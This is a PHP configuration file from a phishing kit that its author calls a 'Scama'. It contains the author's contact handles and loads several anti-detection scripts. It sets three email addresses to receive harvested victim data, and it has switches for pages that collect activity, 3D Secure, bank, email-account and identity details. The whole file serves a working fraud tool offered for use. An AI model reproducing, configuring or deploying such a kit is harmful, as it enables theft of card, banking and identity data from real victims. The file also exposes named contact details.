<?php
/*************************************************
###### ##  ## ###### ###     ##  #######   #######
##     ##  ##     ## ## ##   ##     ###    ##   ##
###### ###### ###### ##  ##  ##    ##      ##   ##
    ## ##  ##     ## ##   ## ##   ###      ##   ##
###### ##  ## ###### ##    ####  #######   #######
*************************************************/
?>
<?php
/*
	//Facebook :- FB.COM/x.SH33NZ0
	// ICQ	   :- 740936161
	// This Scama By SH33NZ0
	// Enjoy with Fucking Result :)
	// If you have any Problem Please call me FB.COM/x.SH33NZ0
	// If you have any good idea to add it on Scama Call me :- FB.COM/x.SH33NZ0
*/
	require_once '../anti/anti0.php';
	require '../anti/anti1.php';
	require '../anti/anti2.php';
	require '../anti/anti3.php';
	require '../anti/anti4.php';
	
/******************************************************************/

	$yours = "abdoalarg53@gmail.com,alarg53@yahoo.com,alarg53@hotmail.com"; 	// WRITE YOUR FUCKING MAIL HERE > NOP

	$skip_activity = false; 	// If u want to skip activity page write 'True' ...

	$skip_3D = false; 		// if u want to skip the 3D page write 'True' ...

	$skip_bank = false; 		// if u want to skip the bank page write 'True' ...

	$skip_email = false; 		// if u want to skip email provider page write 'True' ...

	$skip_identity = false; 	// if u want to skip identity page write 'True' ...


/******************************************************************/

	date_default_timezone_set('GMT');
	$dateNow = date("d/m/Y h:i:s A");

?>